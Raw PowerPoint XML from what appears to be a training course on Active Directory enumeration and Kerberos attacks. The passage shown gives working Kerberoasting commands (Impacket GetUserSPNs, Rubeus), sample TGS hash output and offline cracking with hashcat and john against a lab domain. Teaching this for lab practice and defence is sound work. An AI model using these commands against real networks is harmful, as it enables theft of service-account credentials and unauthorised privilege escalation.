              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> Domain Users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🎯 Meaning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These accounts have SPNs → they are </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>kerberoastable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6965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REQUEST TGS (GET HASH)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From Kali (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Impacket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GetUserSPNs.py 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lab.local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/user:Password123 -dc-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ip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&lt;DC-IP&gt; -request</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> 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impacket-GetUserSPNs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lab.local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/regular_user:Pass123 -dc-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ip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192.168.x.x -request -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outputfile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kerb_hashes.txt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>Tool 2 — Using Rubeus (Windows)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>⚠️ Important clarification:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>👉 Rubeus is primarily an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>attack tool</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>, not just enumeration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chemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Rubeus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700" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>kerberoast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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>format</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>hashcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> 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Or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Rubeus.exe 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kerberoast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/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format:hashcat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/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outfile:kerb_hashes.txt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Or</a:t>
            </a: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Rubeus.exe </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>kerberoast</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> /stats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Output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$krb5tgs$23$*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sqlservice$LAB.LOCAL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$...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This is the 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Kerberoast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hash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✔ Shows count / overview</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t>✔ Less aggressive than full roasting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MSSQLSvc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>/SQL01 → </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>sqlservice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Means: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sqlservice</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> is tied to a service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It has an SPN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It can issue Kerberos service tickets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➡ Therefore:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>🔥 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>It is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Kerberoastable</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1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43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STEP 3 — SAVE HASH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Save output into file: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hashes.txt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> </a:t>
            </a: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— CRACK HASH (OFFLINE)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17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Hashcat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hashcat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-m 13100 hashes.txt /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usr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/share/wordlists/rockyou.txt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> 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OR John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john --wordlist</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>=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usr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/share/wordlists/rockyou.txt hashes.txt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> </a:t>
            </a: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sqlservice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: Password123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You now have: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VALID SERVICE ACCOUNT CREDENTIALS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 err="1"/>
              <a:t>Kerberoasting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> is the #1 way to escalate privileges in AD. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>Kerberoasting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> = Requesting service tickets encrypted with passwords → cracking them offline</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>👉 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>Kerberoasting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> works best when:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Service accounts use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>weak passwords</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Encryption falls back to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>RC4 (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1"/>
              <a:t>etype</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t> 23)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Accounts have </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>high privileges</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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475619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3543753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986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4683</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>666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Black</vt:lpstr>
      <vt:lpstr>Arial Unicode MS</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Calibri Light</vt:lpstr>
      <vt:lpstr>Menlo</vt:lpstr>
      <vt:lpstr>quote-cjk-patch</vt:lpstr>
      <vt:lpstr>Office Theme</vt:lpstr>
      <vt:lpstr>Week 7</vt:lpstr>
      <vt:lpstr>Week 07: Active Directory Enumeration &amp; Kerberos Attacks </vt:lpstr>
      <vt:lpstr>Task 01: Understanding AD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Task 02</vt:lpstr>
      <vt:lpstr>Task 02: AD Enumeration (The "Quiet" Way)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03</vt:lpstr>
      <vt:lpstr>Task 03: AS-REP Roasting (Attacking Users without Pre-Auth)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04</vt:lpstr>
      <vt:lpstr>Task 04: Kerberoasting (Attacking Service Accounts)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</dc:title>
  <dc:creator>Gh0stRift</dc:creator>
  <cp:lastModifiedBy>ad afda</cp:lastModifiedBy>
  <cp:revision>87</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-04-07T06:35:26Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-07-27T11:53:14Z</dcterms:modified>
</cp:coreProperties>
</file>